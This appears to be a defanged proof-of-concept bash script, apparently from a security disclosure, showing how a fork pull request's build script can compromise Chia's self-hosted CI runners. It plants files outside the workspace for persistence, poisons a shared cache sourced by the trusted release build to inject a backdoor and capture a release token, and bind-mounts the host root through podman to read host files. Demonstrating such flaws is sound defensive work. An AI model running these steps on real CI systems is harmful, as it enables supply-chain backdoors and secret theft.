#!/usr/bin/env bash
# ================================================================================
# ATTACKER-CONTROLLED build script as it appears in a FORK PR.
# Mirrors an attacker editing Chia's repo-tracked build.rs / install.sh / pytest.
# BENIGN markers only (CHIA01_FAKE_*). No real payload, no network exfil.
# ================================================================================
set -x
echo "CHIA01_FAKE_ATTACKER_CODE_EXECUTED :: host=$(hostname) user=$(id -un) runner=${RUNNER_NAME:-?} runid=${GITHUB_RUN_ID:-?}"

# (3) PERSISTENCE — write OUTSIDE the workspace. clean-workspace only wipes the
# workspace + $HOME/.npm, so this survives to every future job on this runner.
mkdir -p "$HOME/.poc_backdoor"
echo "implant by fork-PR job runid=${GITHUB_RUN_ID:-?} at $(date -u)" > "$HOME/.poc_backdoor/implant_${GITHUB_RUN_ID:-0}.txt"
echo "[persist] planted $HOME/.poc_backdoor/implant_${GITHUB_RUN_ID:-0}.txt"

# (5)+(6) CACHE/RELEASE POISONING + SECRET THEFT — poison the shared on-host cache
# that the TRUSTED release build restores. When the release job sources this, it
# (a) injects a backdoor line into the release artifact, and
# (b) captures the FAKE release secret that is in the release job's env.
mkdir -p "$HOME/.poc_cache"
cat > "$HOME/.poc_cache/libdep.sh" <<'DEP'
dep_build(){ echo "// CHIA01_FAKE_BACKDOOR implanted into release artifact by poisoned cache"; }
mkdir -p "$HOME/.poc_loot"
echo "stolen_at=$(date -u) CHIA01_FAKE_RELEASE_TOKEN=${CHIA01_FAKE_RELEASE_TOKEN:-<absent-in-this-context>}" >> "$HOME/.poc_loot/stolen.txt"
DEP
echo "[poison] wrote poisoned $HOME/.poc_cache/libdep.sh (consumed by the trusted release build)"

# (4) HOST ACCESS via container runtime with host bind-mount (mirrors build-wheels `docker run -v ...`).
if command -v podman >/dev/null 2>&1; then
  echo "[host] podman run -v /:/host:ro  (proves the job reaches the host filesystem):"
  podman run --rm -v /:/host:ro docker.io/library/alpine:3 sh -c \
    'echo HOST_ACCESS_PROOF:; echo -n "host hostname: "; cat /host/etc/hostname; echo -n "host os: "; head -n1 /host/etc/os-release; echo "host /home:"; ls /host/home' \
    2>&1 | sed 's/^/[host] /' || echo "[host] podman run failed (no registry access) — persistence above already proves no host isolation"
else
  echo "[host] podman not present; $HOME writes above already prove no host isolation"
fi

echo "CHIA01_FAKE benign PoC bench.sh complete"
